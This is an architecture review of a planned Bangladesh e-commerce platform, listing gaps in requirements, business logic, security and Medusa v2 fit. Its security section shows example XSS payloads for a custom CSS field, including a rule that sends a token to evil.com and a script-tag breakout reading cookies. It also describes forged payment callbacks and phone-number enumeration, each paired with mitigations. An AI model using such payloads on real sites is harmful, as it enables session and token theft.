# Architecture Critique & Gap Analysis
## Bangladesh Single-Vendor E-commerce Platform

**Document Type:** Critique — Read-Only Feedback  
**Reviewed Documents:**
- `prd.md` v2
- `user-journeys.md` Draft v1
- `quality-checklist.md`
- `docs/architecture.md` v1.0

**Review Date:** 2026-10-24  
**Review Scope:** Missing requirements, business logic gaps, security issues, Medusa v2 limitations, and technical conflicts.

> **Important:** This document does NOT propose changes to any existing file. All findings are organized by severity and category for owner and engineering review.

---

## Executive Summary

The architecture is well-structured and shows deep platform understanding. However, cross-referencing all four documents reveals **28 specific gaps** across six categories:

| Category | Gap Count | Max Severity |
|---|---|---|
| [A] Missing Requirements (PRD → Architecture) | 7 | Critical |
| [B] Business Logic Gaps | 6 | Critical |
| [C] Security Issues | 5 | Critical |
| [D] Medusa v2 Limitations & Conflicts | 5 | High |
| [E] Technical Conflicts (Cross-Document) | 3 | High |
| [F] Open Questions Not Acknowledged | 2 | Medium |
| **Total** | **28** | — |

---

## [A] Missing Requirements — PRD Exists but Architecture.md Silent

### A-1 🔴 CRITICAL — Audit Log System Completely Missing

**PRD Reference:** FR-12.2, FR-6.7.8, FR-12.8.7  
**Quality Checklist:** CHK-SEC-01, AC-12.1  
**PRD says:** "Audit history for price/stock changes, return/refund decisions, refunds, role/permission changes, order/payment/shipment status changes, theme and content publishing — who, what, when, and why."  
**Architecture says:** Nothing. No audit log module, no DML model, no API route, no storage table.

This is a **confirmed, P0 requirement** with acceptance criteria (AC-12.1: "A staff price change is visible in the audit log with user, old value, new value, timestamp"). The architecture has no mechanism to satisfy this. An `audit_log` table and a corresponding logging service must be added to the data model.

**Missing components:**
- `audit_log` DML model: `actor_id`, `actor_role`, `entity_type`, `entity_id`, `action`, `old_value` (JSON), `new_value` (JSON), `timestamp`, `ip_address`
- Medusa subscriber hooks on `product.price_updated`, `order.status_changed`, `user.role_changed`, etc.
- `/admin/audit-logs` API endpoint (Finance/Owner access only)

---

### A-2 🔴 CRITICAL — Return & Refund Status as a 4th Independent Field Not Modeled

**PRD Reference:** FR-6.7.9, Section 6.2 status model  
**PRD says:** "Return/refund request status is tracked independently from the original order and payment statuses — never overwrites them."  
**Architecture says:** `order_return_request.status` exists, but the architecture's §12 (data model) and §13 (workflows) do not show how this status is:
1. Independently surfaced on the Order Detail admin page alongside the other 3 statuses
2. Visible to customers on the `/track-order` page (FR-4.4.2, FR-6.7.10)
3. Protected from automatic transitions by any webhook, courier event, or payment callback (AC-6.6)

**Gap:** The `return-refund` workflow in §13.1 shows `Finance processes refund → payment captured via bKash API`. This **directly contradicts** PRD FR-6.7.5: "Refunds are never automatically approved, initiated, or marked completed — not by order-status change, payment callback, or courier update." The workflow must not call any payment API automatically; it must only record that a staff member manually initiated and verified a refund.

---

### A-3 🔴 CRITICAL — Invoice/PDF Generation Not in Architecture

**PRD Reference:** FR-11.5, FR-11.7.1, FR-11.7.2  
**PRD says:** "The system generates a printable invoice for each applicable order, built from the order-time snapshot. Authorized admins can edit invoice templates."  
**Architecture says:** Object storage section mentions "invoice PDFs" exist in S3, but:
- No `invoice_template` DML model
- No PDF generation service or library (e.g., Puppeteer, PDFKit)
- No Admin UI route for invoice template editing
- No API endpoint for invoice download
- No file-type/size validation for uploaded template assets (FR-5.1.6)

**This is a Phase 1 confirmed requirement**, not Phase 2.

---

### A-4 🔴 CRITICAL — Homepage/Content Management System Not Architectured

**PRD Reference:** FR-9.1, FR-9.4, FR-9.5, Section 8.1 "Content & Storefront" module  
**PRD says:** "Owner/authorized staff manage homepage sections (hero banners, featured products/categories, promo blocks) via add/edit/hide/reorder — no code changes. Policy pages (About, Contact, FAQ, Privacy, Terms, Shipping, Return/Refund Policy) are editable without code, with draft/preview/publish/unpublish states."  
**Architecture says:** The admin nav mentions `/app/landing-pages` (Campaign Builder) and briefly references "homepage banners" in the storefront page list, but:
- No `homepage_section` or `content_block` DML model
- No `content_page` model for static policy pages
- No Admin CMS route for homepage management
- No draft/preview/publish state machine for content pages
- No rollback mechanism (FR-9.4: "last published version can be restored")

The `bd-campaigns` module handles campaign landing pages, but the PRD defines a separate "Content & Storefront" admin module that is entirely absent from the architecture.

---

### A-5 🟠 HIGH — VAT Configuration Infrastructure Missing

**PRD Reference:** FR-11.4, FR-11.7.3, FR-14  
**PRD says:** "VAT settings are admin-configurable (enable/disable, rate, display rules); the system does not assume VAT applies until the business's actual VAT registration/obligation is confirmed."  
**Architecture says:** BDT region is configured with no mention of VAT settings. No `vat_settings` table, no VAT field in the `bd-settings` module, no conditional VAT line on invoices. The PRD requires VAT to be configurable as a first-class setting — even if the initial value is "disabled", the infrastructure must exist.

---

### A-6 🟠 HIGH — Staff Login Security Mechanisms Not Implemented

**PRD Reference:** FR-8.2.5, FR-8.2.7, FR-8.2.9  
**PRD says:**
- FR-8.2.5: Staff must change their initial password at first login.
- FR-8.2.7: Temporary account lockout after 5 consecutive failed login attempts for 15 minutes.
- FR-8.2.9: 2FA required for Owner/Manager accounts where the authentication system supports it.

**Architecture says:** §6 covers JWT auth and RBAC, but:
- No "force password change on first login" mechanism
- Rate limiting exists for auth endpoints (§7.3), but this is different from account-level lockout tracking (a locked account remains locked even from different IPs)
- No 2FA mention anywhere

**Note:** PRD Q#15 asks whether Medusa's auth already has equivalent lockout — this must be checked before assuming rate limiting covers it.

---

### A-7 🟡 MEDIUM — Storefront Theme & Design Token Management Missing

**PRD Reference:** FR-9.2, FR-9.3  
**PRD says:** "Theme settings (colors, fonts, buttons, spacing) use a controlled design-token set. Color input is validated; system warns on poor text/background contrast."  
**Architecture says:** The Admin has `/app/settings/bangladesh` but no theme settings UI. The storefront uses Tailwind, but there is no runtime theming system, no `theme_settings` store, no contrast validation mechanism. This is a Phase 1 confirmed feature.

---

## [B] Business Logic Gaps

### B-1 🔴 CRITICAL — COD Reservation Expiry (Stock Released When?) Is Unresolved But Not Flagged

**PRD Reference:** FR-6.3.3 "Stock reservation/expiry rules (if used) are explicit [Open — Q#18]"  
**Architecture says:** Orders reserve inventory immediately on placement (§13.1, Step 2). But what happens to an unconfirmed COD order whose customer is unreachable?

- If a COD order stays "Unconfirmed" for 3 days and cannot be confirmed, inventory is locked forever.
- The architecture has no expiry/timeout mechanism for COD reservations.
- No cron job, no workflow timer, no escalation path after N unreachable call attempts.

This is an `Open` item in the PRD (Q#18), but the architecture does not acknowledge it as unresolved — it implies the `cod-confirmation` workflow handles all cases, which it does not.

**Required decision before build:** What happens after 2 failed call attempts? After 24h? After 48h? Who releases the stock? Is the order auto-cancelled or manually cancelled only?

---

### B-2 🔴 CRITICAL — Order Placement Failure Leaves No User Feedback Path for Payment Redirect Abandonment

**PRD Reference:** CHK-PAY-04 (quality-checklist)  
**Quality Checklist says:** "If a customer cancels on bKash/Nagad gateway or payment fails, customer is redirected back to /checkout with a clear message. Cart items and entered address details remain preserved. No orphan placed order is created."

**Architecture says:** In §9.3 (bKash Flow), the flow goes:
1. `BkashProvider.initiatePayment()` → redirect to bKash
2. Customer completes or cancels
3. `POST /hooks/bkash/callback`

**Gap:** When does the Medusa `Cart` get locked/unlocked? If `POST /store/orders` is called before the bKash redirect (to create a pending order), and the customer cancels, the order must be rolled back. If the order is only created after callback success, the cart must remain open during the redirect. Neither flow is explicitly defined. If implemented incorrectly:
- Abandoned bKash flow leaves inventory reserved with no order (orphan reservation)
- Or leaves a "Pending" order that blocks inventory indefinitely

The architecture must explicitly specify: **the order is NOT created until payment callback succeeds**.

---

### B-3 🔴 CRITICAL — Campaign Checkout Preserving Regular Cart vs. Mode B "Direct" Conflict

**PRD Reference:** FR-5.2.3, FR-5.2.6  
**PRD says:** "Campaign checkout adds to the existing shared cart by default and must never silently clear it." AND "A single, separate campaign-only checkout that excludes the regular cart has not been confirmed and is not built in this release."

**Architecture says:** The `LandingPage` model has `checkout_mode: "embedded" | "modal" | "redirect"`. Mode B is described as "combined checkout/order review → confirmation, showing selected product/variant."

**Gap:** If a customer has 3 items in their regular cart and visits a campaign landing page's embedded checkout (Mode B), the architecture does not specify:
1. Do the 3 existing cart items appear in the campaign checkout?
2. Does placing the campaign order via the embedded form clear the regular cart?
3. Can the customer see and edit the regular cart items from inside the embedded landing page checkout?

PRD FR-5.2.3 requires the regular cart be preserved. But AC-5.1 requires "final order contains all 3 lines." This means the campaign embedded checkout must show the full unified cart — which creates a UX complexity that is not addressed in the architecture.

---

### B-4 🟠 HIGH — RTO Stock Return Logic Is Automatic but PRD Says Never Automatic

**Architecture says (§13, return-refund workflow):** "Step 5: Restock inventory (if item in good condition)"  
**PRD says (FR-6.7.14):** "On RTO or physical return receipt, staff record the item's condition (sellable / damaged / not restockable) before any stock adjustment; a damaged or unreviewed item is never automatically returned to sellable stock."

**Conflict:** The architecture's `return-refund` workflow shows restocking as an automatic step. But the PRD is explicit: **staff must record item condition first**. Restocking must be a separate, manually-triggered step — not an automatic consequence of "item_received" status. The workflow must be split:
1. Staff marks "item_received" → triggers condition review prompt
2. Staff records condition ("sellable" / "damaged" / "not restockable")
3. Only if "sellable": Staff triggers manual restock → inventory increments

---

### B-5 🟠 HIGH — COD Settlement Reconciliation Logic Ignores the Delivery Charge Split

**PRD Reference:** FR-14.9  
**PRD says:** "The customer-paid delivery charge collected and the courier cost charged to the business are tracked as separate, independently labeled figures. This distinction is essential for COD settlement reconciliation, where the courier remits collected delivery charges separately from the business's courier costs."

**Architecture says:** `order_bd_details.courier_fee_charged` stores one bigint. The architecture's `bd-reports` module mentions "COD settlement reconciliation" but does not model:
- `customer_paid_delivery` (what customer paid)
- `courier_cost_to_business` (what courier charges the business)
- `cod_settlement_amount_received` (what courier actually remitted)

Without these three separate fields, the COD settlement reconciliation report (§4.2, `bd-reports`) cannot produce the required distinctions from PRD FR-14.9.

---

### B-6 🟠 HIGH — Duplicate Order Prevention on Campaign Mode B Checkout Not Specified

**PRD Reference:** FR-4.3.7, FR-6.2.5  
**Architecture says:** Standard checkout uses `X-Idempotency-Key` header. Campaign landing pages use an "embedded checkout block" but the architecture does not specify whether the embedded checkout form on `/lp/[slug]` also sends an idempotency token or uses the same Medusa cart/order API that is already idempotent.

If the embedded checkout form is a custom form submission (not the standard checkout flow), double-tap or network retry on a slow mobile connection could create duplicate orders. The campaign checkout path must explicitly share the cart-based idempotency mechanism.

---

## [C] Security Issues

### C-1 🔴 CRITICAL — COGS Data Leakable via Meilisearch Search Index

**Architecture says (§8.1):** Meilisearch `products` index contains product data. If COGS (cost of goods per variant) is ever included in the indexed document (even accidentally), it becomes queryable with the public search-only API key.

**Risk:** The Meilisearch search key is exposed to the browser (`NEXT_PUBLIC_MEILISEARCH_SEARCH_KEY`). Any indexed field is readable by any user. If `cogs_bdt` is included in the Meilisearch document for any reason (e.g., included in the Medusa product object that is serialized to Meilisearch), it exposes confidential cost data.

**Required mitigation:** The Meilisearch sync workflow must explicitly whitelist indexed fields and explicitly exclude: `cogs_bdt`, `metadata.cogs`, and any financial cost fields. A denylist is insufficient — only an explicit allowlist prevents accidental COGS leakage.

---

### C-2 🔴 CRITICAL — Customer Phone Number Exposed in Order Tracking Without Rate-Limit Defense

**Architecture says (§14.4 Checkout):** Order tracking by `order_id + phone number`. No rate limiting is specified for `/track-order`.

**Risk:** An attacker with a list of order IDs (which may be sequential integers or predictable UUIDs) can brute-force phone numbers against the tracking endpoint to enumerate customer phone numbers. Bangladesh phone numbers are 11 digits starting with a small set of operator prefixes — the search space is not infinite.

**Required mitigation:**
- Rate limit `/store/orders/track` (or the equivalent) to 10 requests/minute per IP
- Consider requiring partial phone (last 4 digits only) rather than full phone for lookup
- Or add a CAPTCHA after 3 failed attempts

---

### C-3 🔴 CRITICAL — bKash Callback URL Is Not Authenticated

**Architecture says (§9.3 bKash flow):** `POST /hooks/bkash/callback { paymentID, status }` → signature validation.

**Issue:** The architecture specifies "Signature Validation Middleware" for `/hooks/*` in §5.4. However, the bKash Tokenized API callback does not use an HMAC signature in the same way as Steadfast/Pathao webhooks. bKash uses a redirect callback (the customer's browser is redirected to `callbackURL`) — this is **not** a server-to-server webhook with a verifiable signature.

**Risk:** Any actor who knows the callback URL format (which may be guessable) can manually craft a callback request claiming `status: "Completed"` with a fake `paymentID`. Without the `executePayment` call back to bKash to verify, the order could be marked paid.

**Required mitigation:** The callback route must:
1. NOT rely on the callback request's `status` field alone
2. Always call `POST bKash /checkout/payment/execute` server-to-server to verify
3. Only if bKash's execute API returns `transactionStatus: "Completed"` with matching amount → mark paid
4. Treat any discrepancy as a fraud attempt, log it, and do NOT fulfill the order

The architecture §9.3 mentions this correctly ("call bKash /checkout/payment/execute"), but it is listed as an `authorizePayment` step on the callback — the architecture should make explicit that the callback route **does not trust any field** in the incoming request body before executing the verification call.

---

### C-4 🟠 HIGH — Landing Page `custom_css` Field Is an XSS Vector

**Architecture says (§12.2):** `landing_page.custom_css: string (custom CSS)`. The storefront renders this CSS for campaign pages.

**Risk:** If `custom_css` is rendered as a `<style>` tag without sanitization, an attacker with admin access (e.g., a compromised manager account) could inject:
```css
body::before { content: url("https://evil.com/?c=" attr(data-token)); }
```
Or more dangerously:
```
</style><script>document.cookie</script>
```

**Required mitigation:**
- Parse and validate `custom_css` through a CSS sanitizer (e.g., `cssfilter` or server-side CSS validation) before storage
- Use a `Content-Security-Policy` header that blocks inline `<style>` injection from non-trusted sources
- Or eliminate `custom_css` entirely and use design tokens only (aligned with PRD FR-9.2)

---

### C-5 🟠 HIGH — Nagad Private Key Storage Not Specified

**Architecture says (§19 Env Config):** `NAGAD_MERCHANT_PRIVATE_KEY=<rsa-private-key-pem>` stored in `.env`.

**Issue:** RSA private keys in `.env` files are at risk from:
- Accidental git commits (even with .gitignore, CI/CD log leaks are common)
- Environment variable leakage in crash reports, debug logs, or process dumps

**Required mitigation:**
- Store the Nagad RSA private key in a dedicated secrets manager (AWS Secrets Manager, HashiCorp Vault, or at minimum a key file outside the application directory with read-only OS permissions)
- Never pass the raw PEM string through environment variables that may be logged
- The architecture should specify where key files are stored in production, not just "in .env"

---

## [D] Medusa v2 Limitations & Conflicts

### D-1 🟠 HIGH — Medusa Draft Orders Do Not Support Custom BD Fields (Journey 25)

**Architecture says (§15.3):** Manual phone/WhatsApp orders use Medusa's native Draft Orders (`/app/draft-orders`).

**Medusa Limitation:** Medusa's native Draft Orders UI does not have:
1. A phone-number lookup field (it uses email for customer lookup)
2. A delivery zone selector that maps to BD flat-rate shipping options
3. A COD confirmation status field in the draft

**Impact:** Journey 25 (Admin — Manual Order Creation) as specified in `user-journeys.md` requires:
- "Staff enters the customer's 11-digit mobile number" — Draft Orders looks up by email
- "Select delivery zone → shipping fee auto-calculated" — Medusa Draft Orders uses shipping option selection, not a zone picker

**Resolution needed:** Either:
1. Build a custom Admin Route that replicates Draft Order functionality with BD-specific fields, OR
2. Accept that Draft Orders requires post-creation manual entry of delivery zone and COD status via the COD widget

This conflict between "Native Draft Orders" and the actual BD requirements is not acknowledged in the architecture.

---

### D-2 🟠 HIGH — Medusa Admin Widget Injection Zones Are Limited

**Architecture says (§15.2):** Widgets injected at `order.details.side.before`, `order.details.after`, `product.details.after`.

**Medusa Limitation:** Medusa v2 Admin has a fixed set of widget injection zones. Not all desired injection points exist:
- There is no `orders.list.table.row` zone — you cannot inject a "Fast Confirm COD" button directly into an orders table row (as described in technical-plan.md §6.2.1 "Fast Action Buttons")
- There is no widget zone for the Orders list table row actions column

**Impact:** The COD queue's "Fast Action Buttons" (single-click "Confirm COD" from the table row) cannot be implemented via a standard Widget. It requires either:
1. A fully custom Orders list page at `/app/cod-queue` (already planned as a Custom Route)
2. Or accepting that fast COD confirmation only works from the Order Detail page

The architecture should clarify that the "Fast Action" in the orders table is on the `/app/cod-queue` custom route, not on the native `/app/orders` table.

---

### D-3 🟠 HIGH — Medusa's `@medusajs/payment` Module Does Not Support "Partially Paid" for COD Partial Delivery

**Business Scenario:** A customer orders 3 items for ৳3,000 (COD). The courier delivers 2 items and returns 1 (item was damaged in transit). The customer pays ৳2,000. The remaining ৳1,000 is disputed.

**Architecture says:** COD capture occurs when courier webhook posts `DELIVERED`. But "DELIVERED" is binary — either the whole order is delivered or not. Partial delivery scenarios produce a partial COD collection.

**Medusa Limitation:** Medusa's payment `capturePayment` function captures the full authorized amount. There is no native `partial_capture` in `AbstractPaymentProvider` — partial amounts require custom implementation via refunds applied to the captured amount.

**Required acknowledgment:** The architecture must define how partial COD delivery is handled:
- Is the full amount captured and then a partial refund logged?
- Or is manual cash reconciliation used outside the system?
- This is especially relevant for the COD settlement reconciliation report (§4.2, `bd-reports`)

---

### D-4 🟡 MEDIUM — Meilisearch Sync Does Not Handle Medusa's Soft Delete

**Architecture says (§8.2):** "Product Deleted/Unpublished → DELETE /indexes/products/documents/{id}"

**Medusa Behavior:** Medusa uses soft deletes (`deleted_at` field). When a product is soft-deleted, the event fired is `product.deleted`, but the product record still exists in PostgreSQL. However, if the Meilisearch sync workflow fetches the product after receiving the event to build the index document (before the sync step), the record may still be returned by Medusa's internal queries since they sometimes filter by `deleted_at IS NULL` and sometimes do not depending on the query context.

**Risk:** Race condition where a deleted product remains in Meilisearch and is findable by customers for up to 2–5 seconds after deletion, OR where the sync workflow tries to fetch a "deleted" product for re-indexing and receives a 404, causing the workflow to fail with an error instead of cleanly deleting the index entry.

**Required mitigation:** The sync workflow's delete step must directly call `DELETE /indexes/products/documents/{id}` using the product ID from the event payload, without fetching the product first.

---

### D-5 🟡 MEDIUM — Medusa Workflow Idempotency Does Not Prevent Duplicate SMS on Retry

**Architecture says (§13.2):** "All Medusa Workflows tracked by execution ID in Redis (idempotent)."

**Issue:** Medusa Workflow idempotency prevents the same *workflow instance* from running twice. But if the `order-placement` workflow runs, sends an SMS at Step 7, then fails at Step 8 (Meta CAPI), and the compensation rolls back the order — the SMS has already been sent to the customer. The customer receives "Order placed" SMS but no order exists. When the order is retried, the customer gets a second SMS.

**Risk:** This creates a confusing customer experience and may trigger the "max 3 SMS per order per event type within 1 hour" rate limiter (§11.3), blocking the legitimate retry SMS.

**Required mitigation:** SMS dispatch must be the **last** non-compensatable step in the order placement workflow, only executed after all other steps (including Meta CAPI) succeed. Or: use a transactional outbox pattern where SMS is queued but only dispatched after the workflow commits successfully.

---

## [E] Technical Conflicts (Cross-Document)

### E-1 🔴 CRITICAL — Meta CAPI Is Phase 1 in Architecture but Phase 2 in PRD

**PRD Reference:** FR-5.3.7, Section 2.2 "Out of Scope"  
**PRD says explicitly:** "Meta Conversions API (CAPI) is **not a Phase 1 requirement**" and is listed under §2.2 Out of Scope and §15 Phase 2.

**Architecture says:** §5.5 shows a full Meta CAPI Proxy implementation. §13.1 (`order-placement` workflow Step 8) includes "Fire Meta CAPI Purchase event". The environment variables include `META_CAPI_ACCESS_TOKEN`.

**Conflict:** The architecture treats CAPI as a Phase 1 deliverable, but the PRD explicitly defers it to Phase 2 pending a privacy/consent review. This means the architecture is over-scoping Phase 1.

**Resolution required:** Either:
1. The owner explicitly overrides the PRD and confirms CAPI for Phase 1 (documenting the privacy review outcome), OR
2. The architecture removes CAPI from the order-placement workflow and marks it as a Phase 2 addition

---

### E-2 🟠 HIGH — Quality Checklist CHK-MKT-02 Contradicts PRD Phase Scope

**Quality Checklist CHK-MKT-02 [P0]:** "Dual-Layer Meta Pixel + Server Conversions API (CAPI) Deduplication" is marked as P0 (Critical Release Blocker).

**PRD says:** CAPI is Phase 2, not Phase 1.

**Conflict:** The quality checklist has elevated CAPI to a P0 pre-launch blocker, while the PRD explicitly says it is not a launch blocker. These two documents are in direct contradiction. One must be corrected to match the other. If CAPI is confirmed as Phase 1, the PRD must be updated. If CAPI stays Phase 2, CHK-MKT-02 must be re-classified as P2.

---

### E-3 🟠 HIGH — Address Model Conflict: Division Field Missing from Architecture

**PRD Reference:** FR-11.2  
**PRD says:** "Address structure: division, district, upazila/thana, area, address line — adjusted to match the selected courier's required fields."

**Architecture says (§14.4 Checkout):** 
```
2. District (64 zillas) + Thana (upazila) cascading dropdown
3. Street address
```

**Conflict:** PRD requires `division` as the top-level administrative unit, but the architecture's checkout form skips `division` and starts at `district`. This has courier integration implications: Steadfast API requires `city` (which maps to district), but Pathao API requires `city_id` which is based on division → city → zone. If `division` is never collected, Pathao integration will require an extra lookup to resolve the division from the district, which may not always be unambiguous (districts near division boundaries).

**Resolution:** Either collect division, or document exactly which courier APIs require it and confirm the district-only approach works for all supported couriers (Steadfast, Pathao, RedX).

---

## [F] Open Questions Not Acknowledged in Architecture

### F-1 🟡 MEDIUM — PRD Q#3 (Final Status Names) Is Unresolved But Architecture Treats Them as Final

**PRD Reference:** Section 19 Q#3: "Final order/payment/shipment/return status names and allowed transitions... must be signed off before build."

**Architecture says (§12.2):** `order_bd_details.shipment_state` is a fully defined `enum` with 9 values: `"pending_confirmation" | "ready_to_ship" | "dispatched" | "in_transit" | "out_for_delivery" | "delivered" | "delivery_failed" | "rto_initiated" | "rto_received"`.

**Issue:** Medusa DML enums, once migrated, are hard to rename without a schema migration. If the owner later decides the status names should be different (e.g., `"awaiting_confirmation"` instead of `"pending_confirmation"`), it requires a database migration and code changes across all workflow steps, admin widgets, and courier webhooks.

**Recommendation:** Before writing any migration file containing these enum values, get explicit owner sign-off on the exact status names. Mark these as `// PENDING OWNER SIGN-OFF — DO NOT MIGRATE` until resolved.

---

### F-2 🟡 MEDIUM — PRD Q#18 (COD Stock Reservation Expiry) Is Unresolved but Architecture Assumes It Does Not Expire

**PRD Reference:** FR-6.3.3: "Stock reservation/expiry rules (if used) are explicit: when stock is reserved for an unconfirmed order and when it's released. [Open — Q#18]"

**Architecture says:** COD `order_bd_details.cod_status = "unconfirmed"` persists until staff confirms or cancels. No expiry mechanism, no cron job, no escalation timer.

**Business impact:** During a product launch with 500 COD orders, if 100 customers are unreachable for 48 hours, 100 units of inventory are locked. This can make products appear out-of-stock to new customers when stock is actually available but unconfirmed.

**Required before build:** Owner must decide: after how many hours/days does an unreachable COD order auto-cancel or escalate? This drives whether a `cron` workflow step or a timer-based Medusa workflow is needed.

---

## Summary Table: Action Required

| ID | Severity | Category | Action Owner | Blocks Phase 1? |
|---|---|---|---|---|
| A-1 | 🔴 Critical | Missing Req | Engineering | Yes |
| A-2 | 🔴 Critical | Missing Req | Engineering | Yes |
| A-3 | 🔴 Critical | Missing Req | Engineering | Yes |
| A-4 | 🔴 Critical | Missing Req | Engineering | Yes |
| A-5 | 🟠 High | Missing Req | Engineering | No (infrastructure only) |
| A-6 | 🟠 High | Missing Req | Engineering | Yes (security baseline is Phase 1) |
| A-7 | 🟡 Medium | Missing Req | Engineering | No |
| B-1 | 🔴 Critical | Logic Gap | Owner + Engineering | Yes |
| B-2 | 🔴 Critical | Logic Gap | Engineering | Yes |
| B-3 | 🔴 Critical | Logic Gap | Owner + Engineering | Yes |
| B-4 | 🟠 High | Logic Gap | Engineering | Yes |
| B-5 | 🟠 High | Logic Gap | Engineering | No (reporting depth) |
| B-6 | 🟠 High | Logic Gap | Engineering | Yes |
| C-1 | 🔴 Critical | Security | Engineering | Yes |
| C-2 | 🔴 Critical | Security | Engineering | Yes |
| C-3 | 🔴 Critical | Security | Engineering | Yes |
| C-4 | 🟠 High | Security | Engineering | Yes |
| C-5 | 🟠 High | Security | Engineering | Yes |
| D-1 | 🟠 High | Medusa Limit | Engineering | Yes |
| D-2 | 🟠 High | Medusa Limit | Engineering | No (UX impact only) |
| D-3 | 🟠 High | Medusa Limit | Owner + Engineering | No (edge case) |
| D-4 | 🟡 Medium | Medusa Limit | Engineering | No |
| D-5 | 🟡 Medium | Medusa Limit | Engineering | No |
| E-1 | 🔴 Critical | Conflict | Owner | Yes |
| E-2 | 🟠 High | Conflict | Owner | Yes |
| E-3 | 🟠 High | Conflict | Engineering | Yes |
| F-1 | 🟡 Medium | Open Q | Owner | No (can proceed with current names, but risky) |
| F-2 | 🟡 Medium | Open Q | Owner | No (but must resolve before launch) |

---

## Recommended Next Steps

### Immediate (Before Any Code is Written)

1. **Owner Decision Required:** Resolve E-1/E-2 — Is CAPI Phase 1 or Phase 2? Update one of the conflicting documents.
2. **Owner Decision Required:** Resolve B-1 — COD reservation expiry duration (24h? 48h? manual only?).
3. **Owner Decision Required:** Resolve B-3 — Campaign Mode B embedded checkout behavior when regular cart has items.
4. **Architecture Update Required:** Add audit log module (A-1), invoice generation (A-3), content management (A-4).
5. **Security Review Required:** C-1 (COGS/Meilisearch whitelist), C-2 (order tracking rate limit), C-3 (bKash callback trust model).

### Before First Migration

6. **Owner Sign-Off on Status Names:** Resolve F-1 — lock status enum values before writing the first migration.

### Before Courier Integration

7. **Engineering Investigation:** D-1 (Draft Orders vs. BD phone-first flow), E-3 (Division field in address model for Pathao compatibility).

### Before Phase 1 Launch

8. **All remaining items** (B-4, B-5, B-6, C-4, C-5, D-2, D-3, D-4, D-5, A-5, A-6, A-7, F-2) must be resolved.

---

*This review is based on the documents as they exist at the time of analysis. It does not modify any existing file. All decisions marked "Owner + Engineering" require explicit written confirmation before implementation proceeds.*

*Review completed: 2026-10-24*
